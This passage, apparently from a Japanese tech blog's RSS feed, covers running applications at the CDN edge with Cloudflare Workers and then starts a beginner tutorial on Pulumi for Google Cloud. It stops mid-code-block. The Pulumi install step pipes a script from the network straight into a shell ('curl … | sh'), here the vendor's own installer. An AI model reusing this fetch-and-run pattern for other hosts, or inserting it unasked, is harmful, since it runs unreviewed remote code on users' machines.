は広く利用されています。テック系スタートアップ企業においても、現在は資金が少ない時点で柔軟にクラウドリソースを利用できるため、CDN サービスを活用して UX を高めることは有効です。</p><p>他方で、フューチャーのような IT コンサルティング企業やいわゆる SI 企業では、業務アプリケーション開発の割合が高いでしょう。 toB の業務アプリケーションでは、そもそもインターネットアクセスを遮断することがあり、また toC サービスとは求められる非機能要件が異なる場合も多く、CDN が有益な場面は少なそうに思えます。</p><p>しかしながら、現在は業務アプリケーションであってもインターネットアクセスを前提とするものが増えています。例えばグローバル企業の業務システムで拠点が全世界にあるような場合は、CDN を用いた配信が有益になります。 さらには、BtoBtoC の開発や自社サービスの開発を行うことも少なくないため、CDN は私たちのビジネスにも重要な技術要素です。</p><p>以下では、これまでの CDN とは異なる新しい活用法の可能性を紹介します。</p><h2 id="CDN-のエッジサーバーでアプリケーションを実行する"><a href="#CDN-のエッジサーバーでアプリケーションを実行する" class="headerlink" title="CDN のエッジサーバーでアプリケーションを実行する"></a>CDN のエッジサーバーでアプリケーションを実行する</h2><p>ここまで、CDN は静的コンテンツ（HTML&#x2F;CSS&#x2F;ブラウザで動く JavaScript など）を配信する仕組みとして紹介してきました。</p><p>しかし、<strong>近年はこの CDN のエッジサーバーでアプリケーションを実行するサービスが複数登場しています</strong>。</p><p>さきほど説明した React ベースの Web フロントエンドフレームワークである Next.js には Web API を実現する API Routes という機能が含まれています。Next.js アプリケーションを Vercel にデプロイした場合、通常の API Routes は、Vercel が提供する関数実行環境（データセンター）で実行されます。しかし近年、新たに Edge API Routes という機能が追加され、エッジサーバー上で関数を実行できるようになりました。これは Vercel の Edge Runtime というエッジ環境で動作します。</p><p>このようにエッジサーバーでアプリケーションを実行するサービスには、次のようなものがあります:</p><ul><li>Vercel Edge Functions</li><li>Cloudflare Workers</li><li>AWS CloudFront Functions</li><li>AWS Lambda@Edge</li></ul><p>なお、下 2 つの AWS サービスは似ていますが、CloudFront Functions は AWS における「エッジロケーション」、Lambda@Edge は AWS における「リージョンエッジ」で実行されます。そのため、CloudFront Functions の方がクライアントに近い場所で実行されます。</p><p>これらのサービスは、例えば次のようなユースケースをエッジサーバー上で利用できる（すなわち、通常のクラウドより低遅延である）ことが強みとされています:</p><ul><li>ヘッダの書き換え</li><li>トークンの検証と認可</li><li>デバイス判定</li><li>A&#x2F;B テスト</li><li>IP ブロック</li><li>リダイレクト</li></ul><h2 id="Cloudflare-Workers-とは？"><a href="#Cloudflare-Workers-とは？" class="headerlink" title="Cloudflare Workers とは？"></a>Cloudflare Workers とは？</h2><p>ここでは、エッジでアプリケーションを実行する環境としてシンプルで試しやすい Cloudflare Workers を紹介します。</p><p>Cloudflare Workers は Cloudflare 社が提供するサーバレスのサービスです。通常の AWS Lambda や Google Cloud Functions などとは異なり、データセンターではなく CDN のエッジサーバーでコードを実行することができます。</p><p>Cloudflare Workers の特徴として</p><ul><li>0ms cold starts のサポート<ul><li>すなわち、<strong>通常のサーバーレス環境で発生するコールドスタートが発生しない</strong></li><li>Cloudflare workers では内部的にコンテナではなく、isolate と呼ばれる環境を使用しているため実現可能</li></ul></li><li>CPU runtime の 10ms 制限<ul><li>そのため、重い処理は実行できない</li></ul></li></ul><p>を挙げることができます。</p><h3 id="Cloudflare-Workers-のストレージ"><a href="#Cloudflare-Workers-のストレージ" class="headerlink" title="Cloudflare Workers のストレージ"></a>Cloudflare Workers のストレージ</h3><p>Cloudflare Workers では、<strong>エッジロケーションでストレージを利用できます</strong>:</p><ul><li>Cloudflare Workers KV<ul><li>Key-Value ストレージ</li><li>結果整合性</li></ul></li><li>Durable Objects<ul><li>Key-Value ストレージ</li><li><strong>強い</strong>整合性</li></ul></li></ul><h3 id="RDB-サービスの-Cloudflare-D1"><a href="#RDB-サービスの-Cloudflare-D1" class="headerlink" title="RDB サービスの Cloudflare D1"></a>RDB サービスの Cloudflare D1</h3><p>また、<strong>エッジロケーションで RDB が動く Cloudflare D1 も登場しています</strong>。</p><p>D1 は SQLite をベースに構築されています。</p><p>ストレージと同様に、Cloudflare Workers のロジックから操作することができます。</p><h3 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h3><p>Cloudflare Workers では、 <strong><a href="https://developer.mozilla.org/ja/docs/Web/API/Service_Worker_API">Service Worker の API</a> が利用できます</strong> 。<br>※ここでいう「API」は「Web API」ではありません（「ライブラリ」に似た本来の広い意味です）。</p><p>Service Worker とは、Web ブラウザがメインの JS の処理とは別のスレッドで、JS をバックグラウンド実行する仕組み（Web Worker）の一つです。Service Worker は、ブラウザとサーバーの間のプロキシサーバーのように利用することができます。<br>（本記事とは別の文脈で、Service Worker のハンズオン記事を執筆予定です。）</p><p>Cloudflare 独自の API ではなく、<strong>Service Worker API という標準的な記法をすべて使えるのが利点です</strong>。<br>もちろん Service Worker がクライアント（Web ブラウザ）の中で実行されるのに対し、Cloudflare Workers はエッジサーバーで実行される点が異なります。</p><h3 id="Cloudflare-Workers-の開発例"><a href="#Cloudflare-Workers-の開発例" class="headerlink" title="Cloudflare Workers の開発例"></a>Cloudflare Workers の開発例</h3><p>Cloudflare Workers の開発例を試してみましょう。</p><p><strong>注意</strong> Cloudflare は、他のクラウドサービスと同じく、アプリケーションやその他のリソースをインターネットに公開できるサービスです。個人環境以外で試す場合は、所属組織のルールを確認してください。</p><h4 id="基本的な手順"><a href="#基本的な手順" class="headerlink" title="基本的な手順"></a>基本的な手順</h4><p>Cloudflare Workers の開発では、Wrangler（ラングラー）と呼ばれる Cloudflare Workers のための CLI ツールを使います。</p><p>Node.js のインストールされたローカル環境で</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npx wrangler init my-project</span><br><span class="line"><span class="built_in">cd</span> my-project</span><br></pre></td></tr></table></figure><p>を実行すればひな形が作成されます。<code>my-project</code> は自由に変えてください。<br>なお、Would you like to use TypeScript? に対して Yes を返せば、TypeScript の準備が自動で完了し、すぐに使えるようになります！</p><p><code>src/index.js</code> または <code>src/index.ts</code> が Cloudflare Workers のロジックを実装するファイルです。<br>TypeScript を選択したとして、シンプルな文字列を返す Web API を次のように実装します:</p><figure class="highlight ts"><figcaption><span>src/index.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">fetch</span>(<span class="attr">request</span>: <span class="title class_">Request</span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ローカル環境の起動は</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx wrangler dev --<span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>で行い、動作確認できます。 localhost:8787 に Hello World と表示されたら成功です。<br>通常の Web API と同じく、ブラウザや curl コマンド等で確認してください。</p><img src="/images/20230427a/スクリーンショット_2023-04-27_16.47.46.png" alt="" width="586" height="206" loading="lazy"><figure class="highlight ts"><figcaption><span>src/index.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">fetch</span>(<span class="attr">request</span>: <span class="title class_">Request</span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>この <code>fetch</code> が Service Worker API の 1 つです。</p><p>fetch イベント（クライアントからの HTTP リクエスト）を検知するとこのメソッドを実行します。<code>fetch</code> の引数には <code>Request</code> 型で、HTTP リクエストの <code>body</code> や <code>headers</code>、<code>method</code> などのプロパティが含まれています。こうしたプロパティを使えば、通常の Web API と同じようなロジックを記述することができます。</p><p>例えば、GET リクエストのクエリパラメータの <code>message</code> 属性でメッセージを送り、それを読み取ってレスポンスを返す処理を書いてみましょう。</p><figure class="highlight ts"><figcaption><span>src/index.ts</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">fetch</span>(<span class="attr">request</span>: <span class="title class_">Request</span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">switch</span>(request.<span class="property">method</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">const</span> &#123; searchParams &#125; = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>)</span><br><span class="line">        <span class="keyword">const</span> message = searchParams.<span class="title function_">get</span>(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">          <span class="string">`送信されたメッセージは「<span class="subst">$&#123;message&#125;</span>」です。`</span>,</span><br><span class="line">          &#123;<span class="attr">status</span>: <span class="number">200</span>&#125;</span><br><span class="line">        )</span><br><span class="line">      <span class="attr">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">          <span class="string">&#x27;許可されていないHTTPメソッドです。&#x27;</span>,</span><br><span class="line">          &#123;<span class="attr">status</span>: <span class="number">405</span>&#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>クエリパラメータに <code>message=こんにちは</code> を含めてリクエストすると、正しくメッセージが読み込まれ表示されました。</p><img src="/images/20230427a/スクリーンショット_2023-04-27_16.31.52.png" alt="" width="934" height="240" loading="lazy"><p>Wrangler では、デプロイも次のコマンドで簡単に行えます（インターネット公開されるので十分注意してください）。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx wrangler publish</span><br></pre></td></tr></table></figure><p>このように数行のコマンドで、ローカルの動作確認とエッジへのデプロイが完結します。</p><h4 id="様々な活用例"><a href="#様々な活用例" class="headerlink" title="様々な活用例"></a>様々な活用例</h4><p>他の実装例は、<a href="https://developers.cloudflare.com/workers/examples/">公式ドキュメント</a>に記載されています。</p><ul><li>JSON の取得</li><li>リダイレクト</li><li>A&#x2F;B テスト</li><li>CORS ヘッダープロキシ</li><li>トークンの検証と認可</li><li>Basic 認証</li><li>ストレージや DB へのアクセス</li></ul><p>など、<strong>このページが実質的にユースケースのカタログのようになっています</strong>。エッジのアプリケーション実行の可能性を模索し、ぜひ新しい使い道を見つけていきましょう！</p><h2 id="おわりに"><a href="#おわりに" class="headerlink" title="おわりに"></a>おわりに</h2><p>この記事では、社内のクラウド勉強会での発表をもとに、CDN の入門的解説と、エッジでのアプリケーション実行の紹介を行いました。</p><p>春の入門祭り連載はまだまだ続きます！ 引き続きどうぞよろしくお願いいたします。</p><p>次は石野さんの<a href="/articles/20230428a/">初心者による初心者のためのGit入門</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/CDN/">CDN</category>
      
      <category domain="https://future-architect.github.io/tags/CDN-Edge/">CDN Edge</category>
      
      <category domain="https://future-architect.github.io/tags/Cloudflare/">Cloudflare</category>
      
      <category domain="https://future-architect.github.io/tags/Cloudflare-Workers/">Cloudflare Workers</category>
      
      
      <comments>https://future-architect.github.io/articles/20230427a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Pulumiで始めるIaC入門</title>
      <link>https://future-architect.github.io/articles/20230426a/</link>
      <guid>https://future-architect.github.io/articles/20230426a/</guid>
      <pubDate>Tue, 25 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h1 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h1&gt;&lt;p&gt;Technology Inovation Group(TIG)所属の筋肉エンジニアの渡邉です。&lt;/p&gt;
&lt;p&gt;&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h1><p>Technology Inovation Group(TIG)所属の筋肉エンジニアの渡邉です。</p><p><a href="/articles/20230417a/">春の入門連載2023</a> 8日目を担当します。</p><p>普段はクラウドインフラを中心に業務を行なっていますが、インフラリソースを管理するにあたってはIaC（主にTerraform）を使用しています。春の入門ということで、改めてIaCのメリット・デメリットについて整理してみました。また、PulumiというIaCツールに入門してみたので、皆さんと一緒にPulumiについて理解していきたいと思います。</p><h1 id="IaC-Infrastructure-as-Code-とは"><a href="#IaC-Infrastructure-as-Code-とは" class="headerlink" title="IaC(Infrastructure as Code)とは"></a>IaC(Infrastructure as Code)とは</h1><p>IaC (Infrastructure as Code)とは、ネットワーク、サーバ、データベースなどのインフラリソースをコードによって管理しプロビジョニングできることを言います。<br>クラウドを利用している場合、マネジメントコンソールからボタンポチポチでリソースを作成・更新・削除することができます。手動で操作する場合、手順書を用意し手順書に沿ってマネジメントコンソールを操作すると思いますが、手順書を確認していてもオペミスによって意図せずリソースを更新・削除してしまう可能性やマネジメントコンソールは定期的にアップデートされるため、手順書が古くなってしまい意味を成さなくなってくる時もあると思います。</p><p>IaCを利用する場合、インフラリソースのあるべき姿をコードで定義・管理するためインフラリソースの変更前にレビューを挟むことができるので、意図せずリソースを作成・更新・削除してしまう可能性を少なくすることができます。</p><p>IaCで有名なツールとしては以下があります。</p><ul><li>Ansible（主にサーバ内のミドルウェアなどを管理する構成管理ツール）</li><li>Terraform（各クラウドのリソースを管理する構成管理ツール）</li><li>CloudFormation（AWSのリソースを管理する構成管理ツール）</li></ul><h1 id="IaCのメリット"><a href="#IaCのメリット" class="headerlink" title="IaCのメリット"></a>IaCのメリット</h1><h2 id="既存コードの使い回し・各環境への迅速なプロビジョニング"><a href="#既存コードの使い回し・各環境への迅速なプロビジョニング" class="headerlink" title="既存コードの使い回し・各環境への迅速なプロビジョニング"></a>既存コードの使い回し・各環境への迅速なプロビジョニング</h2><p>インフラリソースの構成をコードで管理できるため、一度コードを作成してしまえば同じインフラ構成を作成したい場合、既存のコードを使いまわして構築することができます。また、terraformであればworkspaceという機能を利用することで開発環境・検証環境・本番環境と各環境を同じコードで作成することができます。例えば、咄嗟に性能環境が欲しいとなった場合でも迅速に環境を用意することができます。</p><h2 id="オペレーションミスの防止"><a href="#オペレーションミスの防止" class="headerlink" title="オペレーションミスの防止"></a>オペレーションミスの防止</h2><p>IaCではコードに基づいてプログラムがインフラリソースの作成・更新・削除を行うため、手作業に比べるとオペレーションミスを減らせることができます。主に同じ作業を複数回行う場合であったり、各環境に対して同じ作業を行う場合などは手作業だとミスが起こりやすいので、IaCを用いる場合はミスを減らせると思います。</p><p>また、コードで管理されているためコードの実行前にレビューを挟むことができるため、品質を担保した状態を保つことができます。</p><h2 id="DevOpsツールとの相性がよい"><a href="#DevOpsツールとの相性がよい" class="headerlink" title="DevOpsツールとの相性がよい"></a>DevOpsツールとの相性がよい</h2><p>コード管理されていることによって、Githubなどのリポジトリサービスでバージョン管理することができます。CI&#x2F;CDとも相性が良いので、CI機能を利用してインフラリソースの命名規則をチェックしたり、linterを使用して整形したりなど、たくさんのDevOpsツールを利用して開発・運用効率を上げることが可能になります。</p><h1 id="IaCのデメリット"><a href="#IaCのデメリット" class="headerlink" title="IaCのデメリット"></a>IaCのデメリット</h1><h2 id="IaCツールごとの言語-x2F-ルールが異なるためキャッチアップが必要"><a href="#IaCツールごとの言語-x2F-ルールが異なるためキャッチアップが必要" class="headerlink" title="IaCツールごとの言語&#x2F;ルールが異なるためキャッチアップが必要"></a>IaCツールごとの言語&#x2F;ルールが異なるためキャッチアップが必要</h2><p>IaCツールはTerraformやAnsibleなどがありますが、TerraformはHCL(HashiCorp Configuration Language)という独自言語でインフラリソースの状態をコード化する宣言型のツールとなり、Ansibleはplaybookと呼ばれるファイルにYAMLで構成手順を記述する手続き型ツールになります。各ツールごとのルールや記載方法などをキャッチアップする学習コストがかかります。</p><h2 id="コードと実態で差分が発生するリスク"><a href="#コードと実態で差分が発生するリスク" class="headerlink" title="コードと実態で差分が発生するリスク"></a>コードと実態で差分が発生するリスク</h2><p>IaCのコードによって管理されているインフラリソースに対して、例えば、手作業で変更を加えてしまった場合はコードとの差分が発生します。この差分によって、コードを使用してインフラリソースを更新しようとした際に、エラーが発生し、インフラが更新できなくなる可能性があったり、どちらが正しい構成なのかわからなくなってしまったりします。<br>簡単なインフラリソースの変更であれば、コードから変更するよりもコンソール画面から行ったほうが速い場合があるので、そういう場合にこの事象は発生しやすいと思います。</p><h1 id="Pulumiとは"><a href="#Pulumiとは" class="headerlink" title="Pulumiとは"></a>Pulumiとは</h1><p><a href="https://www.pulumi.com/">Pulumi</a>とは、OSSのIaCツールの一つであり、Terraformは独自のHCL言語でコードを記述しなければなりませんが、Pulumiの場合、アプリケーション開発者がよく使用する言語(Go&#x2F;Java&#x2F;Python&#x2F;Typescript&#x2F;C#&#x2F;Yaml)などでコードを記述することができるため、普段アプリケーションコード書いているエンジニアでも学習コストが低く、使い慣れた言語でインフラリソースをループ処理で作成したりすることができます。AWS&#x2F;GCP&#x2F;Azureなど各クラウドプロバイダーやKubernetesやServerlessにも幅広く対応しています。また、<a href="https://www.pulumi.com/tf2pulumi/">TerraformやCloudFormationからPulumiに変換する</a>ことも可能なため、Pulumiに移行することも可能です。</p><p>Pulumiは無料で利用することができますが、複数人での利用や、企業単位、ミッションクリティカルなシステムを扱う方向けに有償プランもあり、追加機能や充実したサポートを利用することができます。</p><p>詳しくは<a href="https://www.pulumi.com/pricing/">公式ドキュメント</a>を参照ください。</p><img src="/images/20230426a/image.png" alt="" width="1200" height="779" loading="lazy"><p>Pulumiは以下の構成をとります。詳しくは<a href="https://www.pulumi.com/docs/intro/concepts/">公式ドキュメント</a>を参照ください。<br><img src="/images/20230426a/image_2.png" alt="" width="617" height="440" loading="lazy"></p><ul><li>Project：Programや他ファイルを含むディレクトリ</li><li>Program：インフラリソースのあるべき姿を定義したもの</li><li>Resource：インフラリソースを構成するオブジェクト。オブジェクトのプロパティ（設定値）に関しては、Inputs&#x2F;OutPutsによりの別のオブジェクトで利用することが可能</li><li>Stack：Programをデプロイした後のインスタンス。同一のProgramから開発環境&#x2F;検証環境など、用途に応じて複数の環境用にインスタンスを作成が可能</li></ul><p>とにかく、触ってみないと理解することができないので、さっそくさわってみたいとおもいます</p><h1 id="Pulumiを使用してGoogle-Cloudのリソースを作ってみる"><a href="#Pulumiを使用してGoogle-Cloudのリソースを作ってみる" class="headerlink" title="Pulumiを使用してGoogle Cloudのリソースを作ってみる"></a>Pulumiを使用してGoogle Cloudのリソースを作ってみる</h1><p><a href="https://www.pulumi.com/docs/get-started/gcp/">公式チュートリアル</a>に沿って進めていきたいと思います。</p><h2 id="Pulumiのインストール"><a href="#Pulumiのインストール" class="headerlink" title="Pulumiのインストール"></a>Pulumiのインストール</h2><p>Pulumiを利用するため、ローカルのWSL2にPulumiをインストールします。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://get.pulumi.com | sh</span><br><span class="line">$ pulumi version</span><br><span class="line">v3.64.0</span><br></pre></td></tr></table></figure><h2 id="言語ランタイムのインストール"><a href="#言語ランタイムのインストール" class="headerlink" title="言語ランタイムのインストール"></a>言語ランタイムのインストール</h2><p>Pulumiでは、Goを利用しようと思うのでGoをインストールします。<br>こちらは<a href="https://go.dev/dl/">公式ドキュメント</a>を参照ください</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go version</span><br><span class="line">go version go1.20.2 linux/amd64</span><br></pre></td></tr></table></figure><h2 id="GCP初期設定"><a href="#GCP初期設定" class="headerlink" title="GCP初期設定"></a>GCP初期設定</h2><p>ローカルにGoogle Cloud SDKはインストールされている前提で進めます。<br>PulumiはGoogle Cloud リソースとやり取りするためにデフォルトのアプリケーション資格情報を必要とするため、<code>gcloud auth application-default login</code>コマンドを実行して資格情報を取得します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcloud auth application-default login</span><br><span class="line">Go to the following <span class="built_in">link</span> <span class="keyword">in</span> your browser:</span><br><span class="line"></span><br><span class="line">    https://accounts.google.com/o/oauth2/auth?response_type=code&amp;client_id=xxxxxxxxx&amp;redirect_uri=xxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Enter authorization code:</span><br></pre></td></tr></table></figure><p>表示されたURLをブラウザに入力すると、「Googleログイン画面」に遷移します。</p><img src="/images/20230426a/image_3.png" alt="" width="449" height="503" loading="lazy"><p>「許可」をクリックします。<br><img src="/images/20230426a/image_4.png" alt="" width="453" height="833" loading="lazy"></p><p>表示された認証コードをコピーします。<br><img src="/images/20230426a/image_5.png" alt="" width="360" height="558" loading="lazy"></p><p>コピーした認証情報を入力し、「Enter」を押します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Enter authorization code: xxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Credentials saved to file: [/home/xxxxxxxxx/.config/gcloud/application_default_credentials.json]</span><br><span class="line"></span><br><span class="line">These credentials will be used by any library that requests Application Default Credentials (ADC).</span><br></pre></td></tr></table></figure><p>環境変数を介して GCPのデフォルトプロジェクトを設定します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOOGLE_PROJECT=xxxxxxxx</span><br></pre></td></tr></table></figure><h2 id="Pulumiプロジェクトの作成"><a href="#Pulumiプロジェクトの作成" class="headerlink" title="Pulumiプロジェクトの作成"></a>Pulumiプロジェクトの作成</h2><p>Pulumiを利用するためPulumiプロジェクトを作成します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> pulumi &amp;&amp; <span class="built_in">cd</span> pulumi</span><br><span class="line"></span><br><span class="line">$ pulumi new gcp-go</span><br><span class="line">Manage your Pulumi stacks by logging <span class="keyword">in</span>.</span><br><span class="line">Run `pulumi login --<span class="built_in">help</span>` <span class="keyword">for</span> alternative login options.</span><br><span class="line">Enter your access token from https://app.pulumi.com/account/tokens</span><br><span class="line">    or hit &lt;ENTER&gt; to <span class="built_in">log</span> <span class="keyword">in</span> using your browser                   :</span><br></pre></td></tr></table></figure><p>アクセストークンの入力を求められました。<br><code>https://app.pulumi.com/account/tokens</code>にアクセスしてPulumi Cloudの初期設定を行います。</p><p>上記のURLへアクセスするとPulumiのSign In画面へ遷移します。<br>まだ、アカウントを作成していないので<code>Create an accout</code>をクリックします。<br><img src="/images/20230426a/image_6.png" alt="" width="1200" height="888" loading="lazy"></p><p>アカウントを作成するため、今回はE-Mailを利用してアカウントを作成しようと思います。</p><ul><li>Username</li><li>Email</li><li>Password</li></ul><p>を入力し<code>Create Account</code>をクリックします。</p><img src="/images/20230426a/image_7.png" alt="" width="1200" height="895" loading="lazy"><p><code>Personal access tokens</code>の作成を求められるので、<code>Create Token</code>をクリックします。<br><img src="/images/20230426a/image_8.png" alt="" width="1191" height="382" loading="lazy"></p><p><code>description</code>に任意の値を入力します。<br><img src="/images/20230426a/image_9.png" alt="" width="241" height="252" loading="lazy"></p><p>アクセストークンが生成されるので、メモしておきます。<br><img src="/images/20230426a/image_10.png" alt="" width="1200" height="481" loading="lazy"></p><p>先ほどのCLI画面に戻り、生成したアクセストークンを入力します。<br>するとWelcome to Pulumi!と表示されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ pulumi new gcp-go</span><br><span class="line">Manage your Pulumi stacks by logging <span class="keyword">in</span>.</span><br><span class="line">Run `pulumi login --<span class="built_in">help</span>` <span class="keyword">for</span> alternative login options.</span><br><span class="line">Enter your access token from https://app.pulumi.com/account/tokens</span><br><span class="line">    or hit &lt;ENTER&gt; to <span class="built_in">log</span> <span class="keyword">in</span> using your browser                   : xxxxxxxxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Welcome to Pulumi!</span><br><span class="line"></span><br><span class="line">  Pulumi helps you create, deploy, and manage infrastructure on any cloud using</span><br><span class="line">  your favorite language. You can get started today with Pulumi at:</span><br><span class="line"></span><br><span class="line">      https://www.pulumi.com/docs/get-started/</span><br><span class="line"></span><br><span class="line">  Tip: Resources you create with Pulumi are given unique names (a randomly</span><br><span class="line">  generated suffix) by default. To learn more about auto-naming or customizing resource</span><br><span class="line">  names see https://www.pulumi.com/docs/intro/concepts/resources/<span class="comment">#autonaming.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This <span class="built_in">command</span> will walk you through creating a new Pulumi project.</span><br><span class="line"></span><br><span class="line">Enter a value or leave blank to accept the (default), and press &lt;ENTER&gt;.</span><br><span class="line">Press ^C at any time to quit.</span><br></pre></td></tr></table></figure><p>Pulumiのプロジェクト名とプロジェクトの説明を求められるので、任意の値を入力していきます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">project name: (pulum) gcp-test</span><br><span class="line">project description: (A minimal Google Cloud Go Pulumi program) gcp-test</span><br><span class="line">Created project <span class="string">&#x27;gcp-test&#x27;</span></span><br></pre></td></tr></table></figure><p>次に、スタック名を尋ねられます。<code>dev</code>と入力します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Please enter your desired stack name.</span><br><span class="line">To create a stack <span class="keyword">in</span> an organization, use the format &lt;org-name&gt;/&lt;stack-name&gt; (e.g. `acmecorp/dev`).</span><br><span class="line">stack name: (dev) dev</span><br><span class="line">Created stack <span class="string">&#x27;dev&#x27;</span></span><br></pre></td></tr></table></figure><p>最後に、Google Cloud プロジェクトの場合、Google Cloud プロジェクトを選択するよう求められます。Google Cloud プロジェクト ID を入力します。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcp:project: The Google Cloud project to deploy into: xxxxxxxx</span><br><span class="line">Saved config</span><br></pre></td></tr></table></figure><p>上記の設定が完了すると、作業ディレクトリに以下のファイルが生成されます。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── Pulumi.dev.yaml <span class="comment"># 初期化したスタックの構成値が記載されています。</span></span><br><span class="line">├── Pulumi.yaml <span class="comment"># Pulumiプロジェクトの情報が記載されています。</span></span><br><span class="line">├── go.mod</span><br><span class="line">├── go.sum</span><br><span class="line">└── main.go <span class="comment"># スタッリソースを定義する Pulumi のプログラムです。</span></span><br></pre></td></tr></table></figure><p>main.goの見ていきましょう。<br>このPulumiのプログラムは</p><ul><li>USリージョンにGCSバケットを作成</li><li>GCSバケット名をExportする</li></ul><p>内容になっています。</p><figure class="highlight go"><figcaption><span>main.go</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 